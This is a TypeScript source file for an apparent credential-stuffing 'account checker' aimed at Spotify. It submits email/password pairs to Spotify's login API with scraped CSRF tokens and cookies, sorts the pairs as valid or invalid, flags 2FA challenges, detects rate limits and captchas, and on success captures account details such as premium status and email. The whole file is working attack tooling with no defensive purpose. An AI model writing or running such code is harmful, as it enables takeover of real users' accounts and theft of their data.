import { BaseChecker } from './base';
import { CheckResult } from '@/types';

export class SpotifyChecker extends BaseChecker {
  async check(email: string, password: string): Promise<CheckResult> {
    try {
      // Get Spotify login page first
      const loginPageResponse = await this.client.get('https://accounts.spotify.com/en/login');
      const pageText = loginPageResponse.data;
      
      // Extract csrf token
      const csrfMatch = pageText.match(/name="csrf_token" value="([^"]+)"/);
      const csrfToken = csrfMatch ? csrfMatch[1] : '';
      
      const cookies = loginPageResponse.headers['set-cookie'] || [];
      const cookieString = cookies.map(cookie => cookie.split(';')[0]).join('; ');

      // Spotify login attempt
      const loginResponse = await this.client.post(
        'https://accounts.spotify.com/api/login',
        new URLSearchParams({
          username: email,
          password: password,
          csrf_token: csrfToken,
          remember: 'false',
        }),
        {
          headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Cookie': cookieString,
            'Referer': 'https://accounts.spotify.com/en/login',
            'Origin': 'https://accounts.spotify.com',
          },
          maxRedirects: 0,
          validateStatus: (status) => status < 400,
        }
      );

      // Check for successful login (redirect or success response)
      if (loginResponse.status === 200 && !loginResponse.data?.error) {
        // Try to get account details
        const capture = await this.getAccountDetails(cookieString);
        
        return this.createResult(email, password, 'spotify', 'valid', capture);
      }

      // Check for 2FA requirement
      if (loginResponse.data?.challengeId) {
        return this.createResult(email, password, 'spotify', 'valid', {
          twoFactorEnabled: true,
          challengeId: loginResponse.data.challengeId,
        });
      }

      // Check for specific errors
      const errorData = loginResponse.data;
      if (errorData?.error) {
        if (errorData.error === 'invalid_credentials' || 
            errorData.error === 'invalid_grant' ||
            errorData.errorDescription?.includes('password')) {
          return this.createResult(email, password, 'spotify', 'invalid');
        }
      }

      return this.createResult(email, password, 'spotify', 'invalid');
    } catch (error: any) {
      const status = error.response?.status;
      const responseText = error.response?.data || '';

      // Handle rate limiting
      if (status === 429) {
        const rateLimit = this.detectRateLimit(status, error.response.headers);
        return this.createResult(
          email,
          password,
          'spotify',
          'error',
          undefined,
          `Rate limited. Retry after ${rateLimit.retryAfter}s`
        );
      }

      // Handle captcha
      if (this.detectCaptcha(JSON.stringify(responseText))) {
        return this.createResult(
          email,
          password,
          'spotify',
          'error',
          undefined,
          'Captcha required'
        );
      }

      return this.createResult(
        email,
        password,
        'spotify',
        'error',
        undefined,
        error.message
      );
    }
  }

  private async getAccountDetails(cookies: string) {
    try {
      // Try to access Spotify Web API
      const response = await this.client.get(
        'https://www.spotify.com/api/account-overview/v1/profile',
        {
          headers: {
            'Cookie': cookies,
          },
        }
      );

      const data = response.data;
      
      return {
        username: data?.profile?.display_name || data?.profile?.username,
        email: data?.profile?.email,
        country: data?.profile?.country,
        isPremium: data?.profile?.product === 'premium',
        subscription: data?.profile?.product,
        imageUrl: data?.profile?.images?.[0]?.url,
      };
    } catch {
      return {};
    }
  }
}
